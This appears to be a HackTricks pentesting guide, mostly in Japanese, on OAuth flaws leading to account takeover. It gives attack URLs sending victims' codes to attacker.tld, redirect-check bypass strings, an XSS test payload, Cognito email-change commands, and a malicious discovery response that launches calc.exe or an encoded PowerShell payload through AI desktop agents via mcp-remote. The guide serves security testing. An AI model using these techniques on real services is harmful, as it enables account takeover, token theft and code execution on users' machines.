# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## 基本情報 <a href="#d4a8" id="d4a8"></a>

OAuthはいくつかのバージョンがあり、基礎的な情報は [OAuth 2.0 documentation](https://oauth.net/2/) で確認できます。本節では主に広く使われている [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/) に焦点を当て、**アプリケーションが別のアプリケーション（authorization server）のユーザーアカウントにアクセスしたり操作を行ったりすることを可能にする認可フレームワーク** を提供します。

仮想のウェブサイト _**https://example.com**_ を例に考えます。これは非公開の投稿を含めてあなたのすべてのソーシャルメディア投稿を**表示する**ために作られています。これを実現するために OAuth 2.0 が使用されます。_https://example.com_ はあなたのソーシャルメディア投稿への**アクセス権限**を要求します。その結果、_https://socialmedia.com_ 上に同意画面が表示され、**要求されている権限と要求元の開発者** が示されます。あなたが承認すると、_https://example.com_ はあなたに代わってあなたの投稿に**アクセスできる**ようになります。

OAuth 2.0 フレームワーク内の次の構成要素を理解することが重要です:

- **resource owner**: あなた（**user/entity**）は、ソーシャルメディアアカウントの投稿など、自分のリソースへのアクセスを許可します。
- **resource server**: **認証済みリクエストを処理するサーバー**。アプリケーションが `resource owner` に代わって `access token` を取得した後に動作します。例: **https://socialmedia.com**。
- **client application**: **`resource owner` からの認可を求めるアプリケーション**。例: **https://example.com**。
- **authorization server**: **`access tokens` を発行するサーバー**。`resource owner` の認証と承認が行われた後に `client application` に対して発行します。例: **https://socialmedia.com**。
- **client_id**: アプリケーションの公開される一意の識別子。
- **client_secret:** アプリケーションとauthorization serverのみが知る秘密鍵で、`access_tokens` の生成に使用されます。
- **response_type**: 要求する**トークンの種類**を指定する値（例: `code`）。
- **scope**: `client application` が `resource owner` に対して要求している**アクセスレベル**。
- **redirect_uri**: 承認後にユーザーがリダイレクトされる**URL**。通常は事前に登録されたリダイレクトURLと一致する必要があります。
- **state**: ユーザーが認可サーバーへリダイレクトされ戻る際に**データを維持するためのパラメータ**。CSRF対策として機能させるには一意性が重要です。
- **grant_type**: 返されるトークンの種類やグラントタイプを示すパラメータ。
- **code**: `authorization server` から発行される認可コードで、`client_id` と `client_secret` とともに client application が `access_token` を取得するために使用します。
- **access_token**: `client application` が `resource owner` に代わってAPIリクエストを行うために使用する**トークン**。
- **refresh_token**: ユーザーに再度プロンプトを表示することなく新しい `access_token` を取得できるようにするトークン。

### フロー

実際の OAuth フローは次のように進行します:

1. あなたは [https://example.com](https://example.com) にアクセスし、「Integrate with Social Media」ボタンを選択します。
2. サイトは [https://socialmedia.com](https://socialmedia.com) に、https://example.com のアプリケーションがあなたの投稿にアクセスすることを許可するよう承認を求めるリクエストを送信します。リクエストは次のような構造です:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. その後、同意ページが表示されます。
4. 承認後、Social Media は `redirect_uri` に `code` と `state` パラメータを含むレスポンスを送信します:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com はこの `code` を、`client_id` と `client_secret` とともに利用して、あなたに代わって `access_token` を取得するためのサーバー側リクエストを行い、あなたが同意した権限へアクセスできるようにします：
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Finally, the process concludes as https://example.com employs your `access_token` to make an API call to Social Media to access

## 脆弱性 <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), the authorization server must redirect the browser only to **pre-registered, exact redirect URIs**. Any weakness here lets an attacker send a victim through a malicious authorization URL so that the IdP delivers the victim’s `code` (and `state`) straight to an attacker endpoint, who can then redeem it and harvest tokens.

典型的な攻撃フロー:

1. Craft `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` and send it to the victim.
2. 被害者が認証し、スコープを承認する。
3. IdP が `attacker.tld/callback?code=<victim-code>&state=...` にリダイレクトし、攻撃者はリクエストをログに取り、直ちにその code を交換する。

確認すべき一般的な検証バグ:

- **No validation** – any absolute URL is accepted, resulting in instant code theft.
- **Weak substring/regex checks on the host** – lookalikes 例えば `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, `match.com@evil.com` などでバイパスされる。
- **IDN homograph mismatches** – 検証は punycode 形式（`xn--`）で行われるが、ブラウザは攻撃者が管理する Unicode ドメインにリダイレクトする。
- **Arbitrary paths on an allowed host** – `redirect_uri` を `/openredirect?next=https://attacker.tld` や任意の XSS/ユーザーコンテンツエンドポイントに向けると、chained redirects、Referer headers、または注入された JavaScript を通じて leaks the code。
- **Directory constraints without normalization** – `/oauth/*` のようなパターンは `/oauth/../anything` で回避できる。
- **Wildcard subdomains** – `*.example.com` を許可すると、（dangling DNS、S3 bucket などの）任意の takeover が有効なコールバックとなる。
- **Non-HTTPS callbacks** – `http://` URI を通すと、ネットワーク上の攻撃者（Wi‑Fi、企業プロキシなど）が転送中に code を奪う機会を与える。

補助的な redirect 系パラメータ（`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri` など）や OpenID の discovery ドキュメント（`/.well-known/openid-configuration`）も確認し、同様の検証バグを引き継ぐ可能性のある追加エンドポイントを探す。

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

As mentioned in this bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) it might be possible that the redirect **URL is being reflected in the response** of the server after the user authenticates, being **vulnerable to XSS**. Possible payload to test:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - state parameter の不適切な処理 <a href="#bda5" id="bda5"></a>

`state` パラメータは Authorization Code フローの CSRF トークンです：クライアントは各ブラウザインスタンスごとに暗号学的にランダムな値を生成し、そのブラウザだけが読み取れる場所（cookie、local storage など）に保持し、認可リクエストで送信し、同じ値が返されない応答は拒否しなければなりません。値が静的、予測可能、任意、またはユーザーのセッションに紐付いていない場合、攻撃者は自分の OAuth フローを完了して最終的な `?code=` リクエストを取得（送信せずに保持）し、後で被害者のブラウザにそのリクエストを再生させて被害者アカウントを攻撃者の IdP プロファイルにリンクさせることができます。

リプレイのパターンは常に同じです:

1. 攻撃者は自身のアカウントで IdP に認証し、`code`（およびあれば `state`）を含む最後のリダイレクトを傍受します。
2. そのリクエストを破棄して URL を保持し、後でリンク、iframe、自動送信フォームなどの CSRF 原始手段を悪用して被害者のブラウザに読み込ませます。
3. クライアントが `state` を強制しない場合、アプリケーションは攻撃者の認可結果を受け入れ、攻撃者を被害者のアプリアカウントにログインさせます。

テスト中の `state` 処理に関する実践的チェックリスト:

- **`state` が完全に欠落している** – パラメータが一度も現れない場合、ログイン全体が CSRF の対象になります。
- **`state` が必須ではない** – 初期リクエストから削除してみてください。もし IdP がそれでもクライアントが受け入れるコードを発行するなら、防御はオプトインになっています。
- **返された `state` が検証されない** – レスポンス内の値を改ざんします（Burp、MITM プロキシ）。不一致の値を受け入れるということは保存されたトークンが比較されていないことを意味します。
- **予測可能または純粋にデータ駆動の `state`** – 多くのアプリはランダム性を混ぜずにリダイレクトパスや JSON ブロブを `state` に詰め込み、攻撃者が有効な値を推測してフローをリプレイできるようにしています。データをエンコードする前に必ず強いエントロピーを前後に付加してください。
- **`state` 固定（fixation）** – アプリがユーザーに `state` の値を供給させ（例: 作成した認可 URL 経由）、フロー全体で再利用する場合、攻撃者は既知の値を固定し被害者間で再利用できます。

PKCE は認可コードを code verifier に結びつけることで `state` を補完できます（特に public clients に対して）が、Web クライアントはユーザー間の CSRF／アカウント連携のバグを防ぐために引き続き `state` を追跡する必要があります。

### アカウント乗っ取りの事前段階 <a href="#ebe4" id="ebe4"></a>

1. **アカウント作成時にメール確認がない場合**: 攻撃者は被害者のメールを使って事前にアカウントを作成できます。後に被害者がサードパーティサービスでログインすると、アプリケーションが誤ってそのサードパーティアカウントを攻撃者が事前作成したアカウントにリンクしてしまい、不正アクセスにつながる可能性があります。
2. **緩い OAuth のメール検証を悪用する**: 攻撃者はメールを検証しない OAuth サービスに登録し、その後アカウントのメールを被害者のものに変更することで同様に不正アクセスを引き起こす可能性があります。これは最初のシナリオに似ていますが、攻撃ベクターが異なります。

### シークレットの開示 <a href="#e177" id="e177"></a>

`client_id` は意図的に公開されますが、**`client_secret` はエンドユーザーから復元可能であってはなりません**。`client_secret` を **mobile APKs, desktop clients, or single-page apps** に埋め込む Authorization Code の導入は、そのパッケージをダウンロードできる人に資格情報を渡すのと同義です。public clients を検査する際は常に次のことを行ってください:

- APK/IPA、デスクトップインストーラ、または Electron アプリを展開して `client_secret`、JSON にデコードされる Base64 ブロブ、またはハードコーディングされた OAuth エンドポイントを grep します。
- バンドルされた設定ファイル（plist、JSON、XML）や逆コンパイルされた文字列を確認してクライアント資格情報を探します。

攻撃者がシークレットを抽出してしまうと、あとは任意の被害者の認可 `code`（弱い `redirect_uri`、ログなど経由）を盗むだけで、正規アプリを介さず `/token` に独立してリクエストを送り、access/refresh トークンを発行できます。public/native clients は **シークレットを保持できない** と見なすべきです—静的なシークレットの代わりに各インスタンスの code verifier を保持していることを示すために PKCE (RFC 7636) に依存すべきです。テスト中は PKCE が必須かどうか、そしてバックエンドが `client_secret` **または** 有効な `code_verifier` を欠いたトークン交換を実際に拒否するかを確認してください。

### Client Secret Bruteforce

サービスプロバイダの `client_secret` を IdP に対して **bruteforce** してアカウントを盗もうと試みることができます。  
ブルートフォース用のリクエストは次のようになる場合があります:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

クライアントが**code and state**を取得しており、別のページに移動した際にそれが**Referer header**に反映されると、脆弱です。

### Access Token Stored in Browser History

The core guarantee of the Authorization Code grant is that **access tokens never reach the resource owner’s browser**. When implementations leak tokens client-side, any minor bug (XSS, Referer leak, proxy logging) becomes instant account compromise. Always check for:

- **Tokens in URLs** – if `access_token` appears in the query/fragment, it lands in browser history, server logs, analytics, and Referer headers sent to third parties.
- **Tokens transiting untrusted middleboxes** – returning tokens over HTTP or through debugging/corporate proxies lets network observers capture them directly.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, or serialized JSON blobs expose tokens to every script on the origin (including XSS payloads or malicious extensions).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` retain tokens long after logout on shared devices and are script-accessible.

Any of these findings usually upgrades otherwise “low” bugs (like a CSP bypass or DOM XSS) into full API takeover because the attacker can simply read and replay the leaked bearer token.

### Everlasting Authorization Code

Authorization codes must be **short-lived, single-use, and replay-aware**. When assessing a flow, capture a `code` and:

- **Test the lifetime** – RFC 6749 recommends minutes, not hours. Try redeeming the code after 5–10 minutes; if it still works, the exposure window for any leaked code is excessive.
- **Test sequential reuse** – send the same `code` twice. If the second request yields another token, attackers can clone sessions indefinitely.
- **Test concurrent redemption/race conditions** – fire two token requests in parallel (Burp intruder, turbo intruder). Weak issuers sometimes grant both.
- **Observe replay handling** – a reuse attempt should not only fail but also revoke any tokens already minted from that code. Otherwise, a detected replay leaves the attacker’s first token active.

Combining a replay-friendly code with any `redirect_uri` or logging bug allows persistent account access even after the victim completes the legitimate login.

### Authorization/Refresh Token not bound to client

If you can get the **authorization code and use it with a different client then you can takeover other accounts**.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take over** others accounts.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
For more detailed info about how to abuse AWS Cognito check [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### 他のアプリの tokens を悪用 <a href="#bda5" id="bda5"></a>

As [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth フローが **token**（code ではなく）を受け取ることを想定している場合、その token が自分のアプリに属しているかを確認していないと脆弱である可能性があります。

これは、**attacker** が自分のアプリ内で **application supporting OAuth and login with Facebook**（例）を作成できるためです。被害者がその **attacker の application** で Facebook にログインすると、attacker は自分のアプリに与えられたユーザーの **OAuth token** を取得し、それを使って被害者の OAuth アプリに被害者のユーザー token でログインできる可能性があります。

> [!CAUTION]
> したがって、attacker がユーザーに自分の OAuth アプリへアクセスさせることに成功すると、token を期待していてその token が自分の app ID に付与されたものかを確認していないアプリケーションでは被害者のアカウントを乗っ取れる可能性があります。

### 2つのリンクと cookie <a href="#bda5" id="bda5"></a>

According to [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), 被害者に **returnUrl** が attacker のホストを指すページを開かせることが可能でした。この情報は **cookie (RU)** に保存され、後続のステップで **prompt** が **user** にその attacker のホストへアクセスを許可するか尋ねます。

この prompt を回避するために、**returnUrl** を使って RU cookie を設定する **Oauth flow** を開始するタブを開き、prompt が表示される前にそのタブを閉じ、値のない新しいタブを開くことが可能でした。すると **prompt** は attacker のホストについて通知しませんが、cookie は設定されているため、リダイレクト時に **token** が attacker のホストへ送信されます。

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

As explained in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), 一部の OAuth 実装では GET パラメータの **`prompt`** を None（**`&prompt=none`**）と指定することで、ユーザーが既にプラットフォームにログインしている場合にウェブ上の prompt で確認を求められることを防げます。

### response_mode

As [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), **`response_mode`** パラメータで最終 URL のどこに code が提供されるかを指定できる場合があります:

- `response_mode=query` -> code は GET パラメータ内に提供される: `?code=2397rf3gu93f`
- `response_mode=fragment` -> code は URL フラグメントに提供される: `#code=2397rf3gu93f`
- `response_mode=form_post` -> code は `code` という名前の入力を持つ POST フォーム内で提供される
- `response_mode=web_message` -> code は post message で送られる: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth consent/login ダイアログは clickjacking の格好のターゲットです: フレーム化できる場合、attacker はカスタム画像を重ね、実際のボタンを隠し、ユーザーに危険な scopes の承認やアカウント連携を騙して行わせることができます。PoC を次のように作成してください:

1. Load the IdP authorization URL inside an `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. 絶対配置や不透明度のトリックで偽ボタンを隠れた **Allow**/**Approve** コントロールと整列させる。
3. 任意でパラメータ（scopes、redirect URI）を事前入力しておき、盗まれた承認がすぐに attacker に利益をもたらすようにする。

テスト中は IdP ページが `X-Frame-Options: DENY/SAMEORIGIN` か厳格な `Content-Security-Policy: frame-ancestors 'none'` を出力しているかを確認してください。どちらもなければ [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) のようなツールでリスクを実証し、被害者がどれほど容易に attacker のアプリを承認してしまうかを記録してください。追加のペイロード案は [Clickjacking](clickjacking.md) を参照。

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

According to [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), これは username と password を使って OAuth にログインできる OAuth フローです。もしこの単純なフローでユーザーが行える全ての操作にアクセスできる **token** が返される場合、その token を用いて 2FA をバイパスすることが可能です。

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

This [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) は、**referrer** の値に基づく **open redirect** を悪用して OAuth を通じて ATO を実行できた事例を説明しています。攻撃手順は次の通りです:

1. 被害者が attacker のウェブページにアクセスする
2. 被害者が悪意のあるリンクを開き、opener が `response_type=id_token,code&prompt=none` を追加パラメータとして付けて Google OAuth フローを開始し、その **referrer** に attacker のウェブサイトを使用する
3. opener 内でプロバイダが被害者を承認した後、`redirect_uri` パラメータ（被害者側のウェブ）へ 30X のレスポンスで戻すが、その際 referer に attacker のサイトが残っている
4. 被害者の website が **referrer に基づいて open redirect をトリガー** し、被害者を attacker のサイトへリダイレクトする。`response_type` が `id_token,code` だったため、code は URL の **fragment** として attacker に送られ、攻撃者は被害者サイト上で Google を介してユーザーのアカウントを乗っ取れる

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

OAuth の Dynamic Client Registration は一見目立たないものの、特に Server-Side Request Forgery (SSRF) 攻撃に対して重要な脆弱性ベクタとなり得ます。このエンドポイントは OAuth サーバがクライアントアプリケーションの詳細（悪用可能な機密 URL を含む）を受け取ることを可能にします。

主なポイント:

- Dynamic Client Registration は通常 `/register` にマッピングされ、POST リクエストで `client_name`, `client_secret`, `redirect_uris`、ロゴや JSON Web Key Sets (JWKs) のための URL などの詳細を受け取ります。
- この機能は **RFC7591** と **OpenID Connect Registration 1.0** の仕様に従い、SSRF に脆弱になり得るパラメータを含みます。
- 登録プロセスは次のような方法でサーバを意図せず SSRF に晒す可能性があります:
  - **`logo_uri`**: クライアントアプリのロゴ用の URL。サーバがこれを取得すると SSRF を引き起こしたり、URL の取り扱いが不適切だと XSS に繋がる可能性があります。
  - **`jwks_uri`**: クライアントの JWK ドキュメントへの URL。悪意ある内容だとサーバが攻撃者管理下のサーバへアウトバウンドリクエストを行う原因になります。
  - **`sector_identifier_uri`**: `redirect_uris` の JSON 配列を参照する URI。サーバがこれを取得すると SSRF の機会を生みます。
  - **`request_uris`**: クライアントの許可された request URI の一覧。サーバが認可プロセス開始時にこれらを取得する場合に悪用され得ます。

悪用戦略:

- `logo_uri`, `jwks_uri`, `sector_identifier_uri` のようなパラメータに悪意ある URL を入れて新しいクライアントを登録することで SSRF を誘発できます。
- `request_uris` を直接悪用することはホワイトリスト制御で緩和される場合がありますが、事前に登録された attacker 管理下の `request_uri` を提供することで認可フェーズ中に SSRF を引き起こすことができます。

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Research on [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/)（Claude Desktop、Cursor、Windsurf 等の `mcp-remote` クライアントに影響）では、クライアントが IdP メタデータをそのまま OS に渡す場合に dynamic OAuth discovery が RCE の原始操作になり得ることが示されています。リモート MCP サーバは discovery 交換（`/.well-known/openid-configuration` や任意のメタデータ RPC）中に攻撃者制御下の `authorization_endpoint` を返し、`mcp-remote ≤0.1.15` は受け取った文字列をシステムの URL ハンドラ（`start`, `open`, `xdg-open` 等）で呼び出したため、OS がサポートする任意のスキーム/パスがローカルで実行されました。

Attack workflow

1. デスクトップエージェントを hostile MCP/OAuth サーバ（`npx mcp-remote https://evil`）に向ける。エージェントは `401` とメタデータを受け取る。
2. サーバは以下のような JSON を返す:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. クライアントは指定されたURIのOSハンドラを起動します。Windows は `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."` のようなペイロードを受け入れ、macOS/Linux は `file:///Applications/Calculator.app/...` を受け入れます。登録されていれば `cmd://bash -lc '<payload>'` のようなカスタムスキームも許可される場合があります。
4. これはユーザー操作の前に発生するため、**クライアントを攻撃者サーバーと通信するように設定するだけでコード実行が発生します**。

How to test（検証方法）

- OAuth対応のデスクトップ/エージェントで、discovery を HTTP(S) 経由で行い、返されたエンドポイントをローカルで開くもの（Electron apps、CLI helpers、thick clients など）をターゲットにします。
- discovery レスポンスを傍受するかホストし、`authorization_endpoint`、`device_authorization_endpoint`、または同様のフィールドを `file://`、`cmd://`、UNC パス、その他の危険なスキームに置き換えます。
- クライアントがスキームやホストを検証するかどうかを観察します。検証が無ければユーザー権限下で即時実行され、問題が確認されます。
- 異なるスキーム（例：`ms-excel:`, `data:text/html,`, カスタムプロトコルハンドラなど）で繰り返し試し、攻撃対象範囲をマッピングしてクロスプラットフォームでの到達性を実証します。

## OAuth providers Race Conditions

If the platform you are testing is an OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

In OAuth, the sub field uniquely identifies a user, but its format varies by Authorization Server. To standardize user identification, some clients use emails or user handles. However, this is risky because:

- Some Authorization Servers do not ensure that these properties (like email) remain immutable.
- In certain implementations—such as **"Login with Microsoft"**—the client relies on the email field, which is **user-controlled by the user in Entra ID** and not verified.
- An attacker can exploit this by creating their own Azure AD organization (e.g., doyensectestorg) and using it to perform a Microsoft login.
- Even though the Object ID (stored in sub) is immutable and secure, the reliance on a mutable email field can enable an account takeover (for example, hijacking an account like victim@gmail.com).

## Client Confusion Attack

In a Client Confusion Attack, an application using the OAuth Implicit Flow fails to verify that the final access token is specifically generated for its own Client ID. An attacker sets up a public website that uses Google’s OAuth Implicit Flow, tricking thousands of users into logging in and thereby harvesting access tokens intended for the attacker’s site. If these users also have accounts on another vulnerable website that does not validate the token's Client ID, the attacker can reuse the harvested tokens to impersonate the victims and take over their accounts.

## Scope Upgrade Attack

The Authorization Code Grant type involves secure server-to-server communication for transmitting user data. However, if the Authorization Server implicitly trusts a scope parameter in the Access Token Request (a parameter not defined in the RFC), a malicious application could upgrade the privileges of an authorization code by requesting a higher scope. After the Access Token is generated, the Resource Server must verify it: for JWT tokens, this involves checking the JWT signature and extracting data such as client_id and scope, while for random string tokens, the server must query the Authorization Server to retrieve the token’s details.

## Redirect Scheme Hijacking

In mobile OAuth implementations, apps use custom URI schemes to receive redirects with Authorization Codes. However, because multiple apps can register the same scheme on a device, the assumption that only the legitimate client controls the redirect URI is violated. On Android, for instance, an Intent URI like `com.example.app://` oauth is caught based on the scheme and optional filters defined in an app’s intent-filter. Since Android’s intent resolution can be broad—especially if only the scheme is specified—an attacker can register a malicious app with a carefully crafted intent filter to hijack the authorization code. This can **enable an account takeover** either through user interaction (when multiple apps are eligible to handle the intent) or via bypass techniques that exploit overly specific filters, as detailed by Ostorlab's assessment flowchart.

## 参考資料

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)

{{#include ../banners/hacktricks-training.md}}
